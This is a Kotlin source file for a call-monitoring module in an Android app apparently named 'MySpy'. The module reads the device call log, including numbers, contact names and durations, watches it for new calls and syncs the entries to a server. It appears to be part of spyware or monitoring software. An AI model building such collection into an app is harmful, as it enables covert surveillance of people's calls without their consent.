package com.myspy.android.modules.calls

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.util.Log
import androidx.core.content.ContextCompat
import com.myspy.android.data.local.db.entities.CallEntity
import com.myspy.android.data.repository.CallsRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Calls Monitoring Module
 * Monitors and logs all phone calls (incoming, outgoing, missed)
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class CallsModule(
    private val context: Context,
    private val repository: CallsRepository,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "CallsModule"
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.READ_CALL_LOG
        )
    }

    private var contentObserver: ContentObserver? = null
    private var isRunning = false
    private var lastProcessedTimestamp = 0L

    /**
     * Check if all required permissions are granted
     */
    fun hasPermissions(): Boolean {
        return REQUIRED_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Start monitoring calls
     */
    fun start() {
        if (!hasPermissions()) {
            Log.w(TAG, "Missing permissions for calls monitoring")
            return
        }

        if (isRunning) {
            Log.d(TAG, "CallsModule already running")
            return
        }

        Log.i(TAG, "Starting CallsModule")
        isRunning = true

        // Collect existing call logs
        collectExistingCalls()

        // Register content observer for real-time monitoring
        registerContentObserver()
    }

    /**
     * Stop monitoring calls
     */
    fun stop() {
        if (!isRunning) return

        Log.i(TAG, "Stopping CallsModule")
        isRunning = false

        // Unregister content observer
        contentObserver?.let {
            context.contentResolver.unregisterContentObserver(it)
        }
        contentObserver = null
    }

    /**
     * Sync collected data to server
     */
    suspend fun syncData(): Result<Int> {
        if (!hasPermissions()) {
            return Result.failure(Exception("Missing permissions"))
        }

        Log.d(TAG, "Syncing call logs to server")
        return repository.syncToServer()
    }

    /**
     * Get count of unsynced call logs
     */
    suspend fun getUnsyncedCount(): Int {
        return repository.getUnsyncedCount()
    }

    /**
     * Collect existing call logs from device
     */
    private fun collectExistingCalls() {
        scope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "Collecting existing call logs")
                val callsList = mutableListOf<CallEntity>()

                val projection = arrayOf(
                    CallLog.Calls.TYPE,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                    CallLog.Calls.CACHED_NAME
                )

                val cursor = context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC LIMIT 100"
                )

                cursor?.use {
                    val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                    val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                    val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                    val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)

                    while (it.moveToNext()) {
                        val callType = when (it.getInt(typeIndex)) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                            else -> "UNKNOWN"
                        }

                        val number = it.getString(numberIndex) ?: "Unknown"
                        val duration = it.getLong(durationIndex)
                        val timestamp = it.getLong(dateIndex)
                        val contactName = it.getString(nameIndex)

                        callsList.add(
                            CallEntity(
                                type = callType,
                                number = number,
                                duration = duration,
                                timestamp = timestamp,
                                contactName = contactName,
                                synced = false
                            )
                        )

                        // Update last processed timestamp
                        if (timestamp > lastProcessedTimestamp) {
                            lastProcessedTimestamp = timestamp
                        }
                    }
                }

                if (callsList.isNotEmpty()) {
                    repository.saveMultiple(callsList)
                    Log.i(TAG, "Collected ${callsList.size} call logs")
                } else {
                    Log.d(TAG, "No call logs found")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error collecting call logs", e)
            }
        }
    }

    /**
     * Register ContentObserver for real-time call log monitoring
     */
    private fun registerContentObserver() {
        contentObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d(TAG, "Call log changed, collecting new entries")
                collectNewCalls()
            }
        }

        context.contentResolver.registerContentObserver(
            CallLog.Calls.CONTENT_URI,
            true,
            contentObserver!!
        )

        Log.d(TAG, "ContentObserver registered for call logs")
    }

    /**
     * Collect only new call logs (after last processed timestamp)
     */
    private fun collectNewCalls() {
        scope.launch(Dispatchers.IO) {
            try {
                val callsList = mutableListOf<CallEntity>()

                val projection = arrayOf(
                    CallLog.Calls.TYPE,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                    CallLog.Calls.CACHED_NAME
                )

                val selection = "${CallLog.Calls.DATE} > ?"
                val selectionArgs = arrayOf(lastProcessedTimestamp.toString())

                val cursor = context.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    "${CallLog.Calls.DATE} DESC"
                )

                cursor?.use {
                    val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                    val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                    val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                    val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)

                    while (it.moveToNext()) {
                        val callType = when (it.getInt(typeIndex)) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                            else -> "UNKNOWN"
                        }

                        val number = it.getString(numberIndex) ?: "Unknown"
                        val duration = it.getLong(durationIndex)
                        val timestamp = it.getLong(dateIndex)
                        val contactName = it.getString(nameIndex)

                        callsList.add(
                            CallEntity(
                                type = callType,
                                number = number,
                                duration = duration,
                                timestamp = timestamp,
                                contactName = contactName,
                                synced = false
                            )
                        )

                        // Update last processed timestamp
                        if (timestamp > lastProcessedTimestamp) {
                            lastProcessedTimestamp = timestamp
                        }
                    }
                }

                if (callsList.isNotEmpty()) {
                    repository.saveMultiple(callsList)
                    Log.i(TAG, "Collected ${callsList.size} new call logs")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error collecting new call logs", e)
            }
        }
    }
}
